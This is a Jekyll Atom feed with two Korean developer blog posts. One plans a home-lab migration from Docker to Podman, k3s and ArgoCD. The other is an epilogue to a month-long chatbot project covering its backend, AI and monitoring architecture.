<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="ko"><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" hreflang="ko" /><updated>2026-02-10T09:30:00+00:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">Paul’s Archives</title><subtitle>성장하는 개발자, 소통하는 개발자, 빠른 적용을 최 우선으로 삼는 개발자. 다음을 항상 생각하며, 개발 속에서 가치를 만들어내는 것을 목표로 합니다.</subtitle><author><name>Paul2021-R</name></author><entry><title type="html">Project Nexus - Docker를 넘어, 진짜 인프라로</title><link href="http://0.0.0.0:4000/%ED%94%84%EB%A1%9C%EC%A0%9D%ED%8A%B8/2026/02/10/00-init-project-nexus.html" rel="alternate" type="text/html" title="Project Nexus - Docker를 넘어, 진짜 인프라로" /><published>2026-02-10T00:00:00+00:00</published><updated>2026-02-10T00:00:00+00:00</updated><id>http://0.0.0.0:4000/%ED%94%84%EB%A1%9C%EC%A0%9D%ED%8A%B8/2026/02/10/00-init-project-nexus</id><content type="html" xml:base="http://0.0.0.0:4000/%ED%94%84%EB%A1%9C%EC%A0%9D%ED%8A%B8/2026/02/10/00-init-project-nexus.html"><![CDATA[<h2 id="project-nexus-docker를-넘어-진짜-인프라로">Project Nexus: Docker를 넘어, 진짜 인프라로</h2>

<blockquote>
  <p>불완전 연소된 ProtoStar를 살리고 다음을 준비하기 위한 플레이그라운드의 필요성, 3년차 개발자 수준의 인프라 역량을 만드는 여정</p>
</blockquote>

<hr />

<h3 id="출발점-불완전연소된-protostar-그리고">출발점: 불완전연소된 ProtoStar 그리고…</h3>

<p>1년차 메인 서버 개발자로 역할을 수행했다. 그리고 이젠 3년차 개발자의 역량을 갖추어야 다음 도전이 가능하리라 생각하고 있었다. <strong>그런데 AI는 여기서 한 발 더 나아가, 개발자에게 요구되는 역량을 크게 변화시켰다.</strong></p>

<p>그 점을 고려하지 않는다면 생존에서 불가피할 것이라는 생각을 하였고, 결과적으로 AI 와 DevOps 의 역량을 갖추고, 백엔드 개발자로서 제대로된 인프라를 구축하는 역량을, <strong>소프트웨어 아키텍처이자, 오케스트레이터가 되어야 한다고 판단했다.</strong></p>

<p>그리하여 토스 러너스 하이 2기와 함께 시작한 Protostar 프로젝트는 나름 성공적이었다. Next.js 기반의 프론트엔드-챗봇을 구현하고, 백엔드는 Nest.js, FastAPI 를 이용하며 고가용성 체계를 구축하는 과정은 확실히 단순한 백엔드 설계를 넘어서는 여러 도전 요소들을 갖고 있고, 그 결과가 현재 블로그 상에 올라가 있는 챗봇이다.</p>

<p>자못 훌륭하며, 개인적으로 1달이란 시간에 이걸 했다는 사실은 자부심을 가지기에 충분하지 않을까? AI도 DevOps 도 백엔드 설계 역량도 보여줄 수 있는 것들이 있었으니,  자랑스럽게 자랑을 인터뷰 상에서 할 수 있다면 좋겠다 생각한다.</p>

<p><strong>하지만 한편으로 아쉬움은 있다.</strong></p>

<p>기획의 한계, 고려사항들이 있단 점에서 온전한 서비스로의 확장은 포기했다-는 점은 제외하더라도,
기술적 아쉬움, 특히 DevOps 경험에 대한 아쉬움이 크게 남았다.</p>

<p>k8s 방식을 정복할 시간이 부족해 포기했다. 또한 무엇보다 Docker 로 구현 시 안되는 건 없지만, 그렇다고 <strong>‘온전하게’ 유기적으로 동작하지 않는다고 느낀 부분들이 있었다.</strong> Docker Swarm, ReplicaSet 등을 기반으로 고가용성을 구현할 순 있다. 하지만 한계는 명백했다. <strong>k8s 를 선택했을 때 얻을 수 있는 이점에 대해 다시 한 번 떠오르게 되었다.</strong></p>

<p>뿐만 아니라 온프레미스 서버에 약 100여만원을 투자하여 나만의 홈랩을 꾸미게 되면서 깨달은게 있다.</p>

<p>실무 경험이 중요한 이유는, 실무 수준에서의 책임감, 안정성, 고려할 사항 등, 단순히 개인의 자그마한 데모 수준에서는 알 수 없는 ‘실무의 깊이’와 ‘실무의 너비’가 존재한다. 그런 점에서 인프라를 개인의 신분으로 지원 없이 AWS, GCP 등에 올린다면? 유료 사용에서 한계가 발생하고, 할 수 있는 수준의 제약이 발생했을 것이다.</p>

<p>그런데 홈랩으로 꾸미게 되면서, 그러한 한계가 상당 부분 사라졌다. 결국 ‘규모의 경제’는 곧 경험인 것이다.</p>

<p>덕분에 과감히 인프라 선택이 가능하고, 효과적으로 기술을 적용할 수 있었다. 그렇다면 할 일은 무엇인가? 그건 결국 ‘앞으로 가는 것’ 아니겠는가? 결국 인프라는 있으니 더 명료하게 IaC(Infrastructure as Code)를 구현하고, 내가 경험할 수 있는 최선의 인프라 위에서 또 다른 도전을 해야 그게 진짜가 되지 않을까?</p>

<p><strong>그런 점에서 나만의 플레이그라운드, 기반이 필요하다고 판단했다. 그것이 Nexus(기반), 완전한 k8s 기반의 GitOps 서버 클러스터 구축 프로젝트이다.</strong></p>

<hr />

<h3 id="깨달음-지향할-푯대는-어디로-향하는가">깨달음: 지향할 푯대는 어디로 향하는가?</h3>

<h4 id="docker만-쓰던-시절의-한계">Docker만 쓰던 시절의 한계</h4>

<p>Docker는 훌륭한 도구다. 메인 서버로 1년 간 살면서, Docker 로 옮긴 레거시 서버들은 덕분에 엄청난 포텐셜을 얻었고, 최적화, 관리 편의성을 얻었기에 지금의 내 경험, 이력을 만들 수 있었다고 해도 과언이 아니다. 그런 점에서 서비스를 바로 시작하기에 Docker 만한 컨테이닝은 없다고 생각한다.</p>

<p>하지만 막상 ‘고가용성’이란 목표를 지향했을 때 Docker 는 굉장히 아쉬움을 불러일으켰다.</p>

<ol>
  <li><strong>데몬에 종속된 구조</strong>: dockerd가 죽으면 모든 컨테이너가 영향을 받는다. 단일 장애점(SPOF)이 존재한다는 점은 고가용성을 생각할 때, 문제였다. 하나의 컨테이너가 과도한 사용량을 차지하게 되었을 때, 전체 시스템은 문제가 발생한다. AWS 에서 인스턴스를 여러개 분산하는 대안도 있다. 그러나 이는 또 다른 복잡도의 서막이며 대안이 되진 못했다. 어디까지나 보완책이었다.</li>
  <li><strong>보안 취약성</strong>: 기본적으로 root 권한이 필요하다는게 생각보다 큰 부담이었다. rootless 모드는 있지만 2차 시민 취급이었다. 또한 이러한 보안 이슈로 공식 이미지들 마다 다르게 권한이 설정되는 등으로 문제가 되었다.</li>
  <li><strong>k8s와의 괴리감</strong>: Docker Compose로 개발하고, k8s YAML로 배포한다? 로컬과 프로덕션 환경이 달라지고 이는 완벽하지 않은 환경 통제였다. ‘완벽함’이 필요한 백엔드 환경 구축에서 한 점의 오차는 ‘아마추어’란 사실을 증명하는 꼴이라고 생각이 들었다. 플랫폼이 다르면 증상도 달라지고, 특히 이전 후기에서도 다뤘듯, 각 개별 설계가 의존성이 없어도, 관계의 통합은 의존성을 만들고 새로운 증상을 유도한다.</li>
  <li><strong>스크립트 단위의 파편화된 관리 구조</strong>: Dockerfile, docker-compose.yml, Jenkinsfile, 쉘 스크립트 등, CI/CD 파이프라이닝을 구축해보고 얻은 결론은 명확했다. 각각 분리되어 각 역할을 보기엔 명료해보이고 유기적이게 보인다. 하지만 반대로 그렇기에 한 곳을 수정하면 예상하지 못한 곳의 문제가 발생할 수 있고, 이는 결국 ‘단독’으로 볼 때만 ‘희극’이며 ‘전체’를 볼 땐 ‘비극’이었다.</li>
  <li><strong>상태관리의 어려움</strong>: PostgreSQL 이나, Redis, 모니터링 등의 Stateful 서비스에 대한 백업/ 복구 전략에서 수동으로 해야 하는 영역이 존재하며, 고가용성 구성이 상당히 복잡했다.</li>
</ol>

<h4 id="엔터프라이즈-환경에서-요구하는-역량">엔터프라이즈 환경에서 요구하는 역량</h4>

<p>AI를 기반으로 약 100개 정도의 주요 기업들의 백엔드 엔지니어 직군의 공고문을 딥리서치 해보았다. 내가 3년차 수준을 인정 받길 원한다면 단순히 “Docker 써봤어요”로는 부족했다. 이를 압축해서 정리하면 다음과 같았다.</p>

<ul>
  <li><strong>컨테이너 오케스트레이션</strong>: Kubernetes를 실무에서 사용할 수 있고, 이를 기반으로 서비스의 생명주기 제어가 가능한가?</li>
  <li><strong>보안 의식</strong>: 특히 최근의 중요사항이자, 국내에서도 중요해지고 있는 영역으로 서버들 사이의 격리가 명료한가? rootless 컨테이너, 권한 분리, 이미지 스캐닝의 경험이 있는가?</li>
  <li><strong>자동화</strong>: CI/CD 파이프라인의 현대화, GitOps, 롤링 업데이트 등을 통해 서비스의 무결성이 확보되는가? 개발 생산성을 확보 하는가?</li>
  <li><strong>관찰성</strong>: 메트릭, 로그, 추적 시스템 구축하여 운영 문제를 소프트웨어 엔지니어링 방식으로 해결할 수 있는가? SRE(Site Reliability Engineering) 방식으로 대규모 시스템의 안정성, 확장성, 가용성을 극대화 가능한가?</li>
</ul>

<p>결국 안정성, 효율성, 운영 최적화된 역량이 필요했다. 이러한 영역에 대한 나만의 답이 필요했고, 결국 내가 생존하기 위하여 필요한 ‘전문성’이란 무엇인가를 명확하게 정리할 수 있었다.</p>

<hr />

<h3 id="전략-초-현실주의">전략: ‘초’ 현실주의</h3>

<h4 id="온프레미스-서버를-프로덕션-클러스터로">온프레미스 서버를 프로덕션 클러스터로</h4>

<p>보다 현실적이게 짜야 한다고 생각했다. 연습용의 minikube 정도가 아니라 프로덕션처럼 운영을 위한 구성과 실천이 되어야 한다고 판단했다. 오버 엔지니어링, 허세를 하고 싶단 말은 아니다. 현실적으로 과도하지 않으면서도 진짜 엔터프라이즈급을 지향해본다는 그 벨런스를 중요시했다. 향후 더 많은 기술의 플레이그라운드 만들기를 지향한다.</p>

<p>Protostar가 구동 중인 서버 어플리케이션들은 현재 두 대의 온프레미스 서버에서 동작하고 있다. 메인 서버는 서비스를, 서브 서버는 모니터링 / 빌드 및 배포 파이프라인을 담당하고 있다.</p>

<p>여기서 단순히 k8s 를 위한 플랫폼을 설치, k8s 용 스크립트 작성을 해도 되지만… 보다 현실적이고, 무엇보다 IaC 를 극대화하기 위해선, 온프레미스 서버들이 마치 하나처럼 동작하게 만드는 것이 반드시 필요하다고 생각했다.</p>

<p><strong>결론적으로 계획은 이렇다:</strong></p>
<ul>
  <li>개발용으로는 단일 개발 PC에서 작업하여 Podman 기반으로 Docker-free 를 달성.</li>
  <li>Production 은 두 개의 온프레미스 서버에 k3s 기반 Kubernetes 클러스터링을 한다. namespace 를 기반으로 역할을 설정한다. 즉, 한 대 같은 두 대를 만들고, 각 영역은 ‘목적’을 포함시킨다.</li>
  <li>현재 가동 중인 ProtoStar 서비스를 이 환경으로 완전히 마이그레이션한다.(서비스 + 모니터링 스택)</li>
  <li>위의 작업들의 종결 이후, 새로운 서비스들 역시 여기서 동작하며, 테스팅 되며, 배포 된다.</li>
</ul>

<h4 id="로컬에서-프로덕션까지-일관된-환경">로컬에서 프로덕션까지 일관된 환경</h4>

<p>가장 중요한 원칙: <strong>로컬 개발 환경과 프로덕션 환경을 최대한 비슷하게 만들어내는 것이다.</strong></p>

<p><strong>기존 방식:</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>로컬 / 프로덕션: Docker Compose 기반, Jenkins 파이프라이닝 때문에 환경변수를 비롯 차이점 있음
→ 환경이 달라서 "내 컴퓨터에선 되는데요?" 발생, 결과적으로 이미지 차원의 변경 발생 시 2회 적용 되어야 함
</code></pre></div></div>

<p><strong>새로운 방식:</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>로컬: Podman + k8s YAML
프로덕션: k3s + k8s YAML
→ 같은 YAML 파일을 로컬과 클러스터에서 모두 사용
</code></pre></div></div>

<p>Podman의 <code class="language-plaintext highlighter-rouge">podman play kube</code> 명령어를 쓰면 k8s YAML을 로컬에서도 그대로 실행할 수 있다. 이게 핵심이다.</p>

<h4 id="계획">계획</h4>

<p>무작정 달려들기보단, AI 를 기반으로 구현할 항목들을 정리했고, 목표를 지정하였다. 이직 일정과 겹쳐 딜레이가 발생할 순 있으나 최대한 현실적으로 설정해보았다.</p>

<p><strong>Phase 1 (1주): 도구 전환</strong></p>

<ul>
  <li>Docker → Podman 로컬 개발 환경 전환</li>
  <li>기존 Dockerfile이 Podman에서도 돌아가는지 검증</li>
  <li>rootless 환경의 포트 바인딩 제약 해결 (80 → 8080)</li>
</ul>

<p><strong>Phase 2 (0.5주): k8s 기초</strong></p>

<ul>
  <li>k3s 클러스터 구축</li>
  <li>Pod, Deployment, Service 개념 실습</li>
  <li>kubectl 명령어 익히기</li>
</ul>

<p><strong>Phase 3 (0.5주): Dev 환경에 Stateless 서비스 먼저</strong></p>

<ul>
  <li>React, NestJS 같은 무상태 서비스부터 배포</li>
  <li>실패해도 재배포하면 끝이라 학습 비용이 낮음</li>
  <li>서비스 간 통신 (k8s 내부 DNS) 이해</li>
</ul>

<p><strong>Phase 4 (0.5주): Dev 환경에 Stateful 서비스 마이그레이션 해보기</strong></p>

<ul>
  <li>PostgreSQL, Redis 같은 상태 저장 서비스</li>
  <li>StatefulSet, PersistentVolume 개념</li>
  <li>데이터 백업/복구 전략 수립</li>
</ul>

<p><strong>Phase 5 (1주): 자동화와 관찰성</strong></p>

<ul>
  <li>ArgoCD 기반 GitOps CI/CD 파이프라인 구축</li>
  <li>Prometheus + Grafana 모니터링 스택</li>
</ul>

<p><strong>Phase 6 (1주): Production 마이그레이션</strong></p>

<ul>
  <li>지금까지의 실습을 모두 클러스터링 된 온프레미스 서버로 일체 이전한다.</li>
</ul>

<hr />

<h3 id="도구-왜-이-스택인가">도구: 왜 이 스택인가</h3>

<h4 id="podman-보안과-확장성">Podman: 보안과 확장성</h4>

<p><strong>선택 이유 세 가지:</strong></p>

<ol>
  <li><strong>Rootless가 기본</strong>: 일반 사용자 권한으로 컨테이너 실행. 보안 침해 시 피해 범위가 제한된다.</li>
  <li><strong>Daemonless 아키텍처</strong>: 중앙 데몬 없이 각 컨테이너가 독립적으로 실행. dockerd가 죽어서 전체가 멈추는 일이 없다.</li>
  <li><strong>Pod 네이티브 지원</strong>: k8s Pod 개념을 로컬에서도 그대로 사용 가능. 같은 Pod 안의 컨테이너끼리 localhost로 통신한다.</li>
</ol>

<p><strong>리스크:</strong></p>
<ul>
  <li>커뮤니티가 Docker보다 작아서 문제 발생 시 레퍼런스가 적을 수 있음</li>
  <li>일부 Docker 전용 도구와 호환성 이슈 가능 (예: Docker Desktop 기능들)</li>
</ul>

<h4 id="kubernetes-k3s-업계-표준">Kubernetes (k3s): 업계 표준</h4>

<p><strong>선택 이유 세 가지:</strong></p>

<ol>
  <li><strong>업계 표준</strong>: 대부분의 엔터프라이즈 환경이 k8s를 사용. 실무 경험으로 직결된다.</li>
  <li><strong>선언적 구성</strong>: YAML로 원하는 상태를 선언하면 k8s가 알아서 그 상태를 유지한다.</li>
  <li><strong>확장성</strong>: 단일 노드에서 시작해도 나중에 멀티 클러스터로 확장이 자연스럽다.</li>
</ol>

<p><strong>k3s를 선택한 이유:</strong></p>
<ul>
  <li>표준 k8s보다 가볍고 빠름 (메모리 사용량 절반)</li>
  <li>온프레미스 환경에 최적화</li>
  <li>Traefik Ingress가 기본 내장</li>
</ul>

<p><strong>리스크:</strong></p>
<ul>
  <li>학습 곡선이 가파름. Pod, Deployment, Service, Ingress 등 개념이 많음</li>
  <li>초기 설정이 복잡할 수 있음</li>
</ul>

<h4 id="gitops-argocd-자동화와-추적성">GitOps (ArgoCD): 자동화와 추적성</h4>

<p><strong>선택 이유 세 가지:</strong></p>

<ol>
  <li><strong>Git이 진실의 원천</strong>: 모든 배포 상태가 Git 저장소에 기록됨. 언제든 이전 상태로 롤백 가능.</li>
  <li><strong>자동 동기화</strong>: Git에 푸시하면 자동으로 클러스터에 반영. 수동 배포 작업 제거.</li>
  <li><strong>가시성</strong>: 무엇이 언제 누구에 의해 배포되었는지 명확하게 추적 가능.</li>
</ol>

<p><strong>리스크:</strong></p>
<ul>
  <li>초기 설정이 복잡할 수 있음</li>
  <li>Git과 클러스터 상태가 어긋날 경우 디버깅이 어려울 수 있음</li>
</ul>

<hr />

<h3 id="마무리-왜-이-여정이-중요한가">마무리: 왜 이 여정이 중요한가</h3>

<p>이 프로젝트는 단순히 기술 스택을 바꾸는 것이 아니다. <strong>“할 줄 안다”에서 “제대로 한다”로의 전환을 생각하고 있다.</strong></p>

<p>Docker Compose로 띄우는 것과 k8s 클러스터를 운영하는 것은 완전히 다른 차원이다. 전자는 개발자의 편의를 위한 도구이고, 후자는 프로덕션 환경을 위한 플랫폼이다.</p>

<p>ProtoStar는 더 이상 불완전연소된 프로젝트가 아니라, 이제 <strong>내가 엔터프라이즈급 인프라를 구축할 수 있다는 것을 증명하는 살아있는 증거</strong>가 되도록 만들고 싶다. 또한 AI가 개인이 할 수 있는 영역을 극대화 시켜줄 것이니 Nexus 는 그 토대가 될 것이다. 내가 만들 다양한 어플리케이션들의 토대가 되어줄 것이다. 십년의 대장정의 모험이 있다고 하면, 그 기반 중에 기반이 되리라 생각한다.</p>

<p>경험이 현실이 되고, 현실이 직무가 된다. 단순히 개발자라고 불리고 싶진 않다. ‘전문가’가 되어 회사의 시스템들의 운용을 정말 ‘현실적으로’ 해내길 원한다. 그 초석을 만들고 싶다.</p>]]></content><author><name>Paul2021-R</name></author><category term="프로젝트" /><category term="Backend" /><category term="개발" /><category term="Nexus" /><category term="K8s" /><summary type="html"><![CDATA[Project Nexus: Docker를 넘어, 진짜 인프라로]]></summary></entry><entry><title type="html">토스 러너스 하이 2기 에필로그</title><link href="http://0.0.0.0:4000/%EB%AC%B8%EC%A0%9C%ED%95%B4%EA%B2%B0/2026/02/03/00-After-learner's-high.html" rel="alternate" type="text/html" title="토스 러너스 하이 2기 에필로그" /><published>2026-02-03T00:00:00+00:00</published><updated>2026-02-03T00:00:00+00:00</updated><id>http://0.0.0.0:4000/%EB%AC%B8%EC%A0%9C%ED%95%B4%EA%B2%B0/2026/02/03/00-After-learner&apos;s-high</id><content type="html" xml:base="http://0.0.0.0:4000/%EB%AC%B8%EC%A0%9C%ED%95%B4%EA%B2%B0/2026/02/03/00-After-learner&apos;s-high.html"><![CDATA[<h2 id="learners-high-2nd-epilogue">Learner’s High 2nd Epilogue</h2>

<p><img src="/assets/images/posts/2025-12/20251217-021.png" alt="" /></p>

<h3 id="runners-high">Runner’s High</h3>
<p>한창 다이어트를 할 때 일이다. 살을 격하게 빼던 시기, 달리기로 어떻게든 20kg 을 빼려고 발악했다.</p>

<p>뛰기 시작한지 10분, 20분,</p>

<p>시간이 흐를 수록 발목, 무릎이 삐걱거리게 되고, 발 바닥부터 오는 통증은 바늘 위를 뛰고 있는 듯 느껴진다. 그때는 세상 그렇게 달리기 싫었다. 아프다는 것, 그리고 그 통증이 앞으로 계속될 거라는 두려움은 항상 적응되지 않는다.</p>

<p>그런데 신기하게도 30분, 기분은 상쾌해지고, 아프던 통증이 서서히 바닥부터 사라져감을 느낀다. 통-통- 발 바닥이 지면과 떨어질 때, 박자감을 즐길 수 있게되고,  찾아오는 가벼움은 어느새 10분을, 또 어느새 10분을 지나게 만든다. 이것이 러너스 하이(Runner’s high) 라는 달리기를 하면서 느끼게 되는, 정말 신기한 호르몬 세상의 부산물이다.</p>

<p>그리고 토스는 이 이름을 교묘하게 비틀었다. Learner’s High. 그들은 ‘지식습득’, ‘임팩트’ 만이 아니라, 문제를 바라보며 끝까지 달릴 사람, 부딪힐 사람, 힘든 일을 사서 할 사람을 찾아 다녔고, 나는 정말 운 좋게도, 이 반열에 들어갈 수 있게 되었다.</p>

<p>그렇기에 나는 단순히 기능을 구현(CRUD)을 하는것에서 넘어서 SRE 관점의 유량 제어(Traffic Dam) 기능의 설계와 구현, AI의 할루시네이션을 억제하기 위한 RAG 파이프라인, 시스템 생존을 위한 관측성 도구들 일체를 구축해보았다. 하나 같이 힘들고, 숨은 찼다. 하지만 어느새 ‘상쾌함’과 함께 해결해 나간다. 스케일 아웃을 위한 내 나름의 수치 통계를 내 보고 VU 1000에 대한 에러율 0% 구현, AI의 세션 기억력, 실시간 RAG 파이프라인 구축, 토큰 압축률 73% 구현 등을 마주했다.</p>

<p>앞으로의 내용은 Learner’s high. 그리고 이것이 그 한달의 여정의 에필로그다. 해당 코스에 대한 토스 측의 디테일한 기준이나 정보는 공개 불가다. 다행이 내가 달려간 것들에 대해선 이야기 할 수 있다.그러니 <code class="language-plaintext highlighter-rouge">Backend</code>, <code class="language-plaintext highlighter-rouge">AI</code>, <code class="language-plaintext highlighter-rouge">Frontend</code>, <code class="language-plaintext highlighter-rouge">DevOps</code>, 풀 사이클로 진행했던 프로젝트의 한달의 여정을 하나씩 정리하려고 한다. 그 다음 또다른 <code class="language-plaintext highlighter-rouge">Next Step</code> 을 그려볼까 한다.</p>

<p><img src="/assets/images/posts/2026-02/001.png" alt="" /></p>
<blockquote>
  <p>Protostar 챗봇</p>
</blockquote>

<h3 id="what-i-built">What I Built</h3>
<h4 id="ai-devops--현대-백엔드-아키텍처의-필수-요소">AI, DevOps:  현대 백엔드 아키텍처의 필수 요소</h4>
<p>이전 회사에서의 업무를 종료하고, 이직을 준비하기 위하여 방향성을 잡으면서 가장 먼저 생각했던건 두가지다. 하나는 ‘과연 나는 증명된 개발자인가?’ 라는 질문이며, 또 하나는 ‘다음의 시대에 백엔드 개발자들에게 요구될, AI 와 함께 일할 사람들의 자질에는 무엇이 필요할까?’ 라는 질문이다. AI 는 분명 거품도 있다. 그럼에도 임팩트가 있는 것도 사실이기에, 이 두 질문의 답을 내 스스로 내리는 것, 그것이 내가 ‘인재’임을 증명하는 길이라고 생각했다.</p>

<p>그래서 며칠에 걸쳐 온갖 회사들의 공고를 분석하고, 회사 생활을 통해 얻은 인사이트를 한껏 버무렸을 때 얻은 것들은 다음과 같았다.</p>

<ol>
  <li><strong>AI 는 개발 코스트를 엄청나게 낮추었다. 코드의 단가는 사실상 0이다. ‘코드’를 전문성의 가치 기준으로 삼는 것은 부족한 판단이다.</strong></li>
  <li><strong>AI를 통해 도전의 허들이 매우 낮아졌다. 배우기 어렵다, 시간이 없다는 말은 변명이다.</strong></li>
  <li><strong>즉, 회사는 그만큼의 인력을 줄이거나, 동일 인력으로도 더욱 큰 임팩트를 만들고자 할 것이다. 이때 방향성은 AI 를 ‘통해’ 얻으려고 하거나, AI를 ‘기반’으로 얻으려고 할 것이다.</strong></li>
</ol>

<p>우선 AI-Assisted Development(소위 ‘바이브 코딩)은 이미 너무나 명확하다. 요구사항, PRD의 구현 수준만 명확하다면, 코드를 ‘내가 만들 필요’는 없고, 이는 1번을 명료하게 만든다. 특히나 이번 프로젝트에서는 방대한 지식을 필요로 하던 프론트엔드의 구성을, 오로지 AI 구현, 구조만 스스로 파악하는 것으로 해결했다. 이러한 점은 코드의 가치가 얼마나 낮아졌는가에 답을 제공한다. 또한 이러한 점에서 2번 역시 명확하게 연결된다.</p>

<p>그러나 결론적으로 중요한건 마지막 문장이다. <code class="language-plaintext highlighter-rouge">기반</code>이라는 단어는 AI 를 ‘생산 과정’에서 도입했을 때 생길 <code class="language-plaintext highlighter-rouge">생산성의 증대</code>를 의미하며, <code class="language-plaintext highlighter-rouge">통해</code>라는 것은 AI를 도구로 서비스에 적용할 때 생길 <code class="language-plaintext highlighter-rouge">비즈니스 임팩트</code>에 대한 부분이다. AI 의 발전은 진짜이고, 이 발전에서 비롯한 기업과 서비스의 성장, 발전의 욕구는 과연 무엇을 불러올까?</p>

<p>다양한 입장에 따른 해석은 될 것이다. 그러나 필연적으로 <strong>AI는 시스템의 비대화, 리소스의 제약에서 오는 하드웨어 이슈를 어떻게 해결할 것인가?</strong> 라는 질문이 무조건 함께할 것이다- 라고 생각하다. 왜냐하면 AI 는 검색 증강이 필요하고, 여러 프레임워크들의 연동은 당연히 필요하며, 자연어는 필연적으로 처리 로직의 복잡도를 올리며, 입출력하는데 엄청난 리소스, 비용을 쓴다. 하물며 LLM 은 ‘100%’를 보장하지 않아, 그 답변의 튜닝에 세심한 주의가 필요하다.</p>

<p>또한 규모가 크고, 자신들의 기술을 위하여 직접 하드웨어를 가지고 온프레미스로 적용된다면? 일반적인 경우에 비해 고가용성을 얻는데 엄청난 리소스와 최적화가 필요해진다. 여기서 하나의 아이러니가 발생하는데, 그것은 <strong>AI 의 발전으로 커진 시스템을, 다시 과연 AI가 이해할 수 있는가? 라는 부분에 대한 의문</strong>이다. 클라우드 프로바이저들의 제공하는 리소스는 한정되고, 그러는 와중에 실 서비스에 가까운 성능을 내줘야 하고, 동시에 그렇게 비대한 시스템을 가진다면? 이때 생길 비용의 증대는? 이 전체 시스템을 어떻게 통합해서 관리하지? AI 는 가능한가? 여기서 나의 질문의 답은 ‘<strong>가능은 할 것이지만 당장은 아니다</strong>‘였다. 그 비용을 다루고, 완전히 스스로 자가 발전하기 위해선 지금의 하드웨어나, 지금의 AI 방법론, 비용 차원에서 부족하다. 바로 이 지점이 ‘개발자’의 존재 이유라고 생각한다.</p>

<h4 id="구성--증명-그리고-그-이상을-이루기-위한-도전">구성 : 증명 그리고 그 이상을 이루기 위한 도전</h4>
<p>‘증명’하려고 했다. 1년 2개월, 메인 서버 개발자로서의 성과가 결코 ‘과장’이 아님을 증명해야 한다. 이 과정을 통해 나는 AI 를 구축하고, 응용하고, 더 나아가선 AI의 본질을 파악하여 서버를 유지, 보수하고, 고도화 시키는 경험치가 필요하다. 결국 AI 가 하지 못하는 영역은 아키텍쳐에 대한 이해와 각 서비스의 상호작용을 이해하는 것이라 판단했다. AI, DevOps, 그리고 백엔드 이 키워드들을 합쳐 내는 것이 목표가 되었다.</p>

<p>그렇게 기술적으로 달려갈 포인트는 설정 했다. 그렇다면 이번엔 무얼 해결하는 걸 만들 것인가? 그러다 문득 후배의 푸념 섞인 대화, 최근 갔다온 취업 박람회의 HR 담당자의 푸념을 듣고 한 가지 문제에 대해 번뜩이게 되었다. 신입으로 취업하기 어려운 현실, 그런데 동시에 사람이 없다고 이야기 하는 기업들. 왜 서로 말이 다른가? 이 아이러니를 해결할 방법은 없을까?</p>

<p>이 아이러니는 사실 지속적으로 지적되던 이야기다. 신입은 ‘기업이 요구하는게 무엇인가’에 대한 접근이 부실하고, 현실적이지 못하다. 한 마디로 ‘역할’이 요구하는 것이 무엇인지를 파악하지 못한다. 동시에 기업은 ‘일’을 하고 있기에 이러한 현실을 제대로 가르쳐 줄 수 없다. 현실의 제약으로 당장의 결론을 요구할 수 밖에 없다. 이러한 인식의 차이, 데이터의 비대칭성을 해결하는 방법은 없을까?</p>

<p>그 간극을 해결해보고자 프로젝트를 계획했다. 그것이 <code class="language-plaintext highlighter-rouge">Project Protostar(원시성)</code>다. 우주에서 막 먼지들이 뭉쳐 빛을 내며 별이 되려는 시점, 그때 불이 붙도록 돕는 촉매제. AI 를 기반으로 기업 인사들에게는 바쁜 와중에 구직자들의 방대한 자료들을 일일이 볼 필요를 없앤다. 필요한 데이터를 자연어로 요청하고 AI는 이를 효과적으로 전달해줘서 시간과 핵심을 간파한다. 구직자들에게는 AI는 현실에서 기업이 요구하는게 뭔지, 그 질문을 받아 볼 수 있는 창구 역할을 한다. 창구는 곧 구직자의 ‘현실성’을 채우는 동력이 된다. 이러한 구성은 분명 양 극단의 차이나 갭, 소통의 아이러니를 메울 수 있는 도구가 되지 않을까? 생각했고 기획을 진행했다.</p>

<p><img src="/assets/images/posts/2026-02/002.png" alt="" /></p>
<blockquote>
  <p>비즈니스 로직과 AI 워커의 분리, 그리고 관측성을 고려한 인프라 설계</p>
</blockquote>

<p><img src="/assets/images/posts/2026-02/003.png" alt="" />
<img src="/assets/images/posts/2026-02/004.png" alt="" /></p>

<p>우선 기술적 목적을 위해, 기획적 목적을 위해 인프라에 대한 설계를 진행했다.</p>

<ul>
  <li>하나의 공유기, 온프레미스 서버 2대의 연동</li>
  <li>HTTPS 정식 포트는 서비스를 위해 쓰지만, 관리를 위한 연결은 TLS proxy pass 로 다른 포트를 HTTPS 로 연결이 가능하게 구성한다.</li>
  <li>모든 서버는 K8s 로 구축된다 -&gt; <strong>실패</strong> -&gt; 이후 Docker 기반으로 구축함</li>
  <li>모든 서버는 Docker 와 하드웨어를 위해 추적 인스턴스를 갖춘다
    <ul>
      <li><code class="language-plaintext highlighter-rouge">Monitoring</code>: Node Exporter / cAdvisor</li>
    </ul>
  </li>
  <li>서브 서버는 모니터링이 주 업무로 한다. 이에 아래의 기술스택을 포함한다.
    <ul>
      <li><code class="language-plaintext highlighter-rouge">Monitoring</code>: Grafana / Prometheus / Loki</li>
      <li><code class="language-plaintext highlighter-rouge">DB</code>: MinIO (RAG 용 자료의 원본 데이터)</li>
    </ul>
  </li>
  <li>메인 서버는 서비스를 주 업무로 한다. 이에 아래의 기술스택을 포함한다.
    <ul>
      <li><code class="language-plaintext highlighter-rouge">Frontend</code>: Next.js</li>
      <li><code class="language-plaintext highlighter-rouge">Backend 1</code>: Nest.js - Business Logic, RateLimiter, Guard, throttle</li>
      <li><code class="language-plaintext highlighter-rouge">Backend 2</code>: FastAPI - OpenAI API - <code class="language-plaintext highlighter-rouge">OpenRouter LLM Serving</code></li>
      <li><code class="language-plaintext highlighter-rouge">Monitoring</code>: Promtail</li>
      <li><code class="language-plaintext highlighter-rouge">DB</code>: Redis(Pub/Sub, message), PostgreSQL(pgVector)(DB, VectorDB)</li>
    </ul>
  </li>
</ul>

<p>우선 모든 서비스를 구현하는데 있어 클라우드에서는 비용 문제을 포함하여 여러 제약이 많다고 판단했다. 이런 상황에선 고가용성을 얻기 위한 테스트 등을 하기 쉽지 않다. 이에 온프레미스 환경에서 직접 모두 구현해냄으로써 DevOps 관점에서 그 전체적인 흐름, 특징 등을 제대로 이해하고 싶었다.</p>

